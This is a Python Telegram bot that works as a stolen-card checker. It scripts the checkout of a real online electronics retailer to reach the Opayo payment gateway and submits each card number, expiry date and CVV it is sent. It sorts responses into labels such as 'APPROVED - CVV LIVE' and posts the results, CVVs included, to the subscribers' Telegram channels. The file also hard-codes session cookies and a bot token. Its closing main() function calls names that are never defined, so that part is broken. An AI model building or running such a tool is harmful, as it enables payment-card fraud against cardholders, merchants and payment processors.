import re
import requests
import json
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, unquote
import urllib3
from datetime import datetime
import time
import telebot
from threading import Thread

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# CONFIGURATION
# ============================================================
BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
bot = telebot.TeleBot(BOT_TOKEN)

# Subscribers Configuration
SUBSCRIBERS = {
    844663875: {  # Mostafa's User ID
        "name": "Mostafa Ragab",
        "channel_id": -1003292682385  # His channel ID (UPDATE THIS!)
    }
    # Add more subscribers here:
    # 123456789: {
    #     "name": "Another User",
    #     "channel_id": -1001234567890
    # }
}

BASE = "https://www.rapidonline.com"
BASKET_URL = BASE + "/checkout/basket"
TOORDER_URL = BASE + "/checkout/basket/toorder"
PARAMS = {"pEx": "4"}
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

# Initial cookies
initial_cookies = {
    'lantern': 'acae1b5d-f800-4e2d-8364-1492a117d8c1',
    'wtstp_nv': '1',
    'wtstp_nv_s': '1',
    'wt_mcp_sid': '2802285916',
    'LPVID': 'IxZmZhMDIxYWNlNjkyNzdl',
    'LPSID-66449020': 'w51M_sGJTImLyqQzMUc-5Q',
    '.AspNet.Consent': 'yes',
    '_ra_func': 'true',
    '_ra_perf': 'true',
    '_ra_adv': 'true',
    '_ra_Initial': 'true',
    '_ga': 'GA1.1.932453915.1761758104',
    '__hstc': '57241397.72c5200adc9d6d8ebf2d8ae05e71125a.1761758106430.1761758106430.1761758106430.1',
    'hubspotutk': '72c5200adc9d6d8ebf2d8ae05e71125a',
    '__hssrc': '1',
    'CustomSearchUser': '20b5a52d-3c49-4540-bd99-834c3c36990e',
    'ra_Vat': 'false',
    'ra_NewType': '1',
    'Loop54User': 'ba495721-c02b-4464-9dc9-5b2a89c2af58',
    'ra_BAS': 'L3ZduBJfweo2kca9khjBJw%3D%3D',
    '.AspNetCore.Antiforgery.ewfMgV3Kz2g': 'CfDJ8IAvExQjoXNFuGlpY7xOM3RJzu-LaHt3ii3ADRgdoUH2nWn91Z-nGVVQb7zFGSnKrf4OKgLW_1sCCyJM3QAdF0_1V96pbpRy-2ZwyL6uKyz8QnMzqpbhEsxcIk2K2-KGkeBTknIKzJCy_HC7TlFc4ys',
    'ra_session': 'CfDJ8IAvExQjoXNFuGlpY7xOM3TJD4kqy8kVk6kVCtL1MaLncrAvGsYfuqvAKguiOqqIJ5nvChsN4WyCrXhVAOYEUoSvxN%2BhdhENvJ96YY1RhQ5TwZaSqC9ldGBNg6VqC0aaxR4Dv44R3jIzmMKkYD6VbGlf%2BK%2BdqAWgWCUp3e8Vz3UG',
}

# ============================================================
# CARD CHECKING FUNCTIONS
# ============================================================

def analyze_response(html_content):
    """Analyze response and return status"""
    html_lower = html_content.lower()
    
    # Check for CCN (3D Secure Challenge)
    if 'paymentauthenticationchallenge' in html_lower or 'action="https://hk.paymentauthenticationchallenge' in html_lower:
        return "CCN", "3D Secure Challenge Required"
    
    # Check for Approved (Authorization in progress)
    if 'your payment is being authorised' in html_lower or 'opayo - authorisation' in html_lower:
        return "APPROVED", "Payment Approved - CVV LIVE"
    
    # Check for Declined (3DS Failed)
    if '3d-authentication failed' in html_lower and 'rejected by the issuer' in html_lower:
        return "DECLINED", "3D Authentication Failed - Rejected by Issuer"
    
    # Check for card errors
    if 'card expiry date is invalid' in html_lower:
        return "ERROR", "Invalid Card Expiry Date"
    
    if 'the card number is not valid' in html_lower:
        return "ERROR", "Invalid Card Number"
    
    if 'security code' in html_lower and 'invalid' in html_lower:
        return "ERROR", "Invalid CVV/Security Code"
    
    # Check for generic errors
    if 'error processing transaction' in html_lower or 'server error' in html_lower:
        return "ERROR", "Transaction Error"
    
    return "UNKNOWN", "Unknown Response"

def get_opayo_cookies():
    """Extract Opayo cookies from the flow"""
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Referer": "https://www.rapidonline.com/checkout/order/redirect?pEx=4"})
    s.cookies.update(initial_cookies)
    
    try:
        # 1) GET basket
        r = s.get(BASKET_URL, params=PARAMS, timeout=30)
        soup = BeautifulSoup(r.text, "html.parser")
        
        uid = (soup.find("input", {"name": "UniqueRequestId"}) or {}).get("value")
        token = (soup.find("input", {"name": "__RequestVerificationToken"}) or {}).get("value")
        
        # Fallback regex
        if not uid:
            m = re.search(r'name=["\']UniqueRequestId["\'][^>]*value=["\']([0-9a-f-]{36})["\']', r.text, re.I|re.S)
            uid = m.group(1) if m else None
        if not token:
            m = re.search(r'name=["\']__RequestVerificationToken["\'][^>]*value=["\']([^"\']+)["\']', r.text, re.I|re.S)
            token = m.group(1) if m else None
        
        if not uid or not token:
            return None
        
        # 2) POST toorder
        headers_post = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": BASE,
            "referer": f"{BASKET_URL}?pEx=4",
            "x-requested-with": "XMLHttpRequest",
            "requestverificationtoken": token,
            "User-Agent": UA,
        }
        payload = {
            "CustomerOrderNumber": "",
            "ScheduleDate": "",
            "UniqueRequestId": uid,
            "PaymentProvider": "1",
            "Misc": "",
        }
        r2 = s.post(TOORDER_URL, headers=headers_post, data=payload, timeout=30, allow_redirects=False)
        
        # Parse redirect URL
        redirect_url = None
        try:
            j = r2.json()
            redirect_url = j.get("RedirectUrl") if isinstance(j, dict) else None
        except Exception:
            pass
        if not redirect_url:
            redirect_url = r2.headers.get("Location")
        
        if not redirect_url:
            return None
        
        if redirect_url.startswith("/"):
            redirect_url = urljoin(BASE, redirect_url)
        
        qs = parse_qs(urlparse(redirect_url).query)
        if "paymenturl" in qs:
            opayo_url = unquote(qs["paymenturl"][0])
        else:
            opayo_url = redirect_url
        
        # 3) Follow Opayo flow
        s.get(opayo_url, allow_redirects=True, timeout=30, verify=False)
        s.get("https://live.opayo.eu.elavon.com/gateway/service/carddetails", 
              headers={"Referer": opayo_url, "Origin": "https://live.opayo.eu.elavon.com"}, 
              allow_redirects=True, timeout=30, verify=False)
        
        # 4) Extract cookies
        wanted = "live.opayo.eu.elavon.com"
        def domain_match(cd, wd=wanted):
            if not cd: return False
            cd = cd.lstrip(".").lower(); wd = wd.lstrip(".").lower()
            return cd == wd or cd.endswith("."+wd)
        
        cookies = {c.name: c.value for c in s.cookies if domain_match(c.domain)}
        if not cookies:
            cookies = {c.name: c.value for c in s.cookies}
        
        return cookies
        
    except Exception as e:
        return None

def check_card(card_data):
    """Check a single card"""
    try:
        # Get fresh cookies for each card
        opayo_cookies = get_opayo_cookies()
        if not opayo_cookies:
            return {
                "card": card_data,
                "status": "ERROR",
                "message": "Failed to extract cookies",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        
        card_number, exp_month, exp_year, cvv = card_data.split("|")
        card_number = card_number.strip()
        exp_month = exp_month.strip().zfill(2)
        exp_year = exp_year.strip()
        
        # Convert year to last 2 digits
        if len(exp_year) == 4:
            exp_year = exp_year[-2:]
        
        cvv = cvv.strip()
        
        # Prepare headers
        headers_card = {
            'Host': 'live.opayo.eu.elavon.com',
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Chromium";v="141", "Not?A_Brand";v="8"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://live.opayo.eu.elavon.com',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': UA,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'iframe',
            'Sec-Fetch-Storage-Access': 'active',
            'Referer': 'https://live.opayo.eu.elavon.com/gateway/service/carddetails',
            'Priority': 'u=0, i',
        }
        
        data_card = {
            'browserJavaEnabled': 'false',
            'browserColorDepth': '24',
            'browserScreenHeight': '786',
            'browserScreenWidth': '1397',
            'browserTZ': '-180',
            'challengeWindowSize': '05',
            'cardholder': 'details saad',
            'cardnumber': card_number,
            'expirymonth': exp_month,
            'expiryyear': exp_year,
            'securitycode': cvv,
            'action': 'proceed',
        }
        
        # Send request
        response = requests.post(
            'https://live.opayo.eu.elavon.com/gateway/service/carddetails',
            cookies=opayo_cookies,
            headers=headers_card,
            data=data_card,
            verify=False,
            timeout=30
        )
        
        # Analyze response
        status, message = analyze_response(response.text)
        
        return {
            "card": card_data,
            "card_number": card_number,
            "exp_month": exp_month,
            "exp_year": exp_year,
            "cvv": cvv,
            "status": status,
            "message": message,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
    except Exception as e:
        return {
            "card": card_data,
            "status": "ERROR",
            "message": str(e),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

def format_result(result):
    """Format result for Telegram message"""
    card_display = f"{result['card_number'][:6]}...{result['card_number'][-4:]}" if 'card_number' in result else "Unknown"
    exp = f"{result['exp_month']}/{result['exp_year']}" if 'exp_month' in result else "N/A"
    cvv = result.get('cvv', 'N/A')
    status = result['status']
    message = result['message']
    
    # Emoji based on status
    if status == "APPROVED":
        emoji = "✅"
    elif status == "CCN":
        emoji = "⚠️"
    elif status == "DECLINED":
        emoji = "❌"
    else:
        emoji = "⁉️"
    
    text = f"{emoji} **{status}**\n\n"
    text += f"**Card:** `{card_display}`\n"
    text += f"**Exp:** `{exp}`\n"
    text += f"**CVV:** `{cvv}`\n"
    text += f"**Message:** {message}\n"
    text += f"**Time:** {result['timestamp']}\n"
    text += f"━━━━━━━━━━━━━━━━"
    
    return text

# ============================================================
# TELEGRAM BOT HANDLERS
# ============================================================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if user_id in SUBSCRIBERS:
        subscriber = SUBSCRIBERS[user_id]
        bot.reply_to(message, f"👋 Welcome {subscriber['name']}!\n\nSend me cards in format:\n`card|month|year|cvv`\n\nOr send multiple cards (one per line)", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ You are not authorized to use this bot.")

@bot.message_handler(func=lambda message: True)
def handle_cards(message):
    user_id = message.from_user.id
    
    # Check if user is authorized
    if user_id not in SUBSCRIBERS:
        bot.reply_to(message, "❌ You are not authorized to use this bot.")
        return
    
    subscriber = SUBSCRIBERS[user_id]
    channel_id = subscriber['channel_id']
    
    # Extract cards from message
    text = message.text.strip()
    cards = [line.strip() for line in text.split('\n') if '|' in line]
    
    if not cards:
        bot.reply_to(message, "❌ Invalid format. Send cards as:\n`card|month|year|cvv`", parse_mode="Markdown")
        return
    
    # Notify user
    bot.reply_to(message, f"⏳ Checking {len(cards)} card(s)...\nResults will be sent to your channel.")
    
    # Check cards in background
    def check_cards_thread():
        for i, card in enumerate(cards, 1):
            try:
                # Send processing message
                bot.send_message(channel_id, f"🔄 Checking card {i}/{len(cards)}...", parse_mode="Markdown")
                
                # Check card
                result = check_card(card)
                
                # Format and send result
                formatted_result = format_result(result)
                bot.send_message(channel_id, formatted_result, parse_mode="Markdown")
                
                # Delay between checks
                if i < len(cards):
                    time.sleep(2)
                    
            except Exception as e:
                bot.send_message(channel_id, f"❌ Error checking card {i}: {str(e)}")
        
        # Send summary
        bot.send_message(channel_id, f"✅ Finished checking {len(cards)} card(s)!", parse_mode="Markdown")
    
    # Start thread
    Thread(target=check_cards_thread, daemon=True).start()

# ============================================================
# MAIN
# ============================================================

def main():
    print("[🤖] Starting Opayo Telegram Bot...")
    print(f"[📢] Channel ID: {CHANNEL_ID}")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("[✅] Bot is running...")
    app.run_polling(drop_pending_updates=True)  # 🔥 ضيف drop_pending_updates=True
